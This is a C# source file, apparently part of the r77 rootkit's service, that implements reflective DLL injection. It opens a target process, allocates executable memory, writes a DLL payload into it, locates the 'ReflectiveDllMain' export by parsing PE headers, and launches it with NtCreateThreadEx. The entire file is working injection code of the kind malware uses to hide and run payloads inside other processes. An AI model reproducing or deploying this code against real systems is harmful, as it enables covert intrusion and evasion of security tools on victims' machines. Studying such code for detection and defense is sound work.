using System;
using System.Linq;
using System.Runtime.InteropServices;

/// <summary>
/// Reflective DLL injection implementation for the r77 service.
/// </summary>
public static class Inject
{
	/// <summary>
	/// Injects a DLL using reflective DLL injection.
	/// <para>The DLL must export a function called "ReflectiveDllMain".</para>
	/// <para>The bitness of the target process must match that of the DLL file.</para>
	/// </summary>
	/// <param name="processId">The process to inject the DLL in.</param>
	/// <param name="dll">The DLL file to inject</param>
	/// <returns>
	/// <see langword="true" />, if the DLL was successfully injected;
	/// <see langword="false" />, if injection failed.
	/// </returns>
	public static bool InjectDll(int processId, byte[] dll)
	{
		IntPtr process = OpenProcess(0x43a, false, processId);
		if (process != IntPtr.Zero)
		{
			// Get function pointer to the shellcode that loads the DLL reflectively.
			int entryPoint = GetExecutableFunction(dll, "ReflectiveDllMain");
			if (entryPoint != 0)
			{
				IntPtr allocatedMemory = VirtualAllocEx(process, IntPtr.Zero, (uint)dll.Length, 0x3000, 0x40);
				if (allocatedMemory != IntPtr.Zero)
				{
					if (WriteProcessMemory(process, allocatedMemory, dll, dll.Length, out _))
					{
						IntPtr thread = IntPtr.Zero;
						return NtCreateThreadEx(ref thread, 0x1fffff, IntPtr.Zero, process, (IntPtr)((long)allocatedMemory + entryPoint), allocatedMemory, false, 0, 0, 0, IntPtr.Zero) == IntPtr.Zero;
					}
				}
			}
		}

		return false;
	}

	private static bool IsExecutable64Bit(byte[] image)
	{
		int ntHeaders = BitConverter.ToInt32(image, 0x3c);

		if (BitConverter.ToInt32(image, ntHeaders) == 0x4550)
		{
			switch (BitConverter.ToInt16(image, ntHeaders + 0x18))
			{
				case 0x10b: return false;
				case 0x20b: return true;
				default: throw new Exception();
			}
		}
		else
		{
			throw new Exception();
		}
	}
	private static int GetExecutableFunction(byte[] image, string functionName)
	{
		int ntHeaders = BitConverter.ToInt32(image, 0x3c);
		int exportDirectory = RvaToOffset(image, BitConverter.ToInt32(image, ntHeaders + 0x18 + (IsExecutable64Bit(image) ? 0x70 : 0x60)));
		int numberOfNames = RvaToOffset(image, BitConverter.ToInt32(image, exportDirectory + 0x18));
		int nameDirectory = RvaToOffset(image, BitConverter.ToInt32(image, exportDirectory + 0x20));
		int nameOrdinalDirectory = RvaToOffset(image, BitConverter.ToInt32(image, exportDirectory + 0x24));

		for (int i = 0; i < numberOfNames; i++)
		{
			int nameOffset = RvaToOffset(image, BitConverter.ToInt32(image, nameDirectory));
			string name = new string(image.Skip(nameOffset).Take(functionName.Length + 10).Select(b => (char)b).ToArray());

			if (name.Contains(functionName))
			{
				return RvaToOffset(image, BitConverter.ToInt32(image, RvaToOffset(image, BitConverter.ToInt32(image, exportDirectory + 0x1c)) + BitConverter.ToInt16(image, nameOrdinalDirectory) * 4));
			}

			nameDirectory += 4;
			nameOrdinalDirectory += 2;
		}

		return 0;
	}
	private static int RvaToOffset(byte[] image, int rva)
	{
		int ntHeaders = BitConverter.ToInt32(image, 0x3c);
		short numberOfSections = BitConverter.ToInt16(image, ntHeaders + 0x6);
		short sizeOfOptionalHeader = BitConverter.ToInt16(image, ntHeaders + 0x14);

		for (short i = 0; i < numberOfSections; i++)
		{
			byte[] section = new byte[0x28];
			Buffer.BlockCopy(image, ntHeaders + 0x18 + sizeOfOptionalHeader + i * 0x28, section, 0, 0x28);

			int virtualAddress = BitConverter.ToInt32(section, 0xc);
			int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
			int pointerToRawData = BitConverter.ToInt32(section, 0x14);

			if (i == 0 && rva < pointerToRawData)
			{
				return rva;
			}
			else if (rva >= virtualAddress && rva < virtualAddress + sizeOfRawData)
			{
				return rva - virtualAddress + pointerToRawData;
			}
		}

		return 0;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint allocationType, uint protect);
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, out IntPtr numberOfBytesWritten);
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern IntPtr NtCreateThreadEx(ref IntPtr thread, uint desiredAccess, IntPtr objectAttributes, IntPtr process, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);
}